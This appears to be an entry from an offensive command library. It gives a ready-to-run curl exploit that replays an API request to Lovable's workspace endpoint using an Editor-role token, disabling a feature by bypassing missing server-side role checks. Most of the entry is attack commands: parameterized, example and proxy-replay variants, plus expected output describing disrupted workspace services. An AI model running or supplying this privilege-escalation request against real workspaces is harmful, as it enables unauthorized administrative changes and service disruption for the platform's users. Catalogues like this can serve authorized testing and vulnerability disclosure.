---
id: cmd-lovable-editor-disable-001
data: >-
  curl -X POST
  "https://lovable-api.com/workspaces/<WORKSPACE_ID>/tool-preferences/supabase/enable"
  -H "Authorization: Bearer <EDITOR_JWT>" -H "Content-Type: application/json" -d
  '{"approval_preference":"disable"}'
tags:
  - api
  - authorization-bypass
  - privilege-escalation
type: command
output: null
executor: bash
platforms:
  - Web
  - Cloud
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:07.083Z'
verified: false
validated: true
submitted: true
---
# disable-lovable-cloud-editor

## Command

```bash
curl -X POST "https://lovable-api.com/workspaces/<WORKSPACE_ID>/tool-preferences/supabase/enable" \
  -H "Authorization: Bearer <EDITOR_JWT>" \
  -H "Content-Type: application/json" \
  -d '{"approval_preference":"disable"}'
```

## Description

This command replays a modified API request to disable the Lovable Cloud feature using an Editor's JWT token, exploiting the lack of server-side role checks to achieve privilege escalation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| WORKSPACE_ID | The ID of the target workspace | Yes |
| EDITOR_JWT | Bearer token for Editor account | Yes |
| approval_preference | Payload value to disable the feature (\"disable\") | Yes |

## Examples

### Basic Usage

```bash
curl -X POST "https://lovable-api.com/workspaces/abc123/tool-preferences/supabase/enable" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." \
  -H "Content-Type: application/json" \
  -d '{"approval_preference":"disable"}'
```

### Advanced Usage

Replay via proxy after modification:

```bash
curl -x http://127.0.0.1:8080 -X POST "https://lovable-api.com/workspaces/abc123/tool-preferences/supabase/enable" \
  -H "Authorization: Bearer <EDITOR_JWT>" \
  -H "Content-Type: application/json" \
  -d '{"approval_preference":"disable"}'
```

## Expected Output

HTTP/2 200 OK response, confirming disable despite Editor role, e.g., {"status":"disabled"}. Workspace services disrupted.

## Related

- [[commands/disable-lovable-cloud-admin]]
- [[procedures/Exploit-Improper-Authorization-in-Lovable-API]]
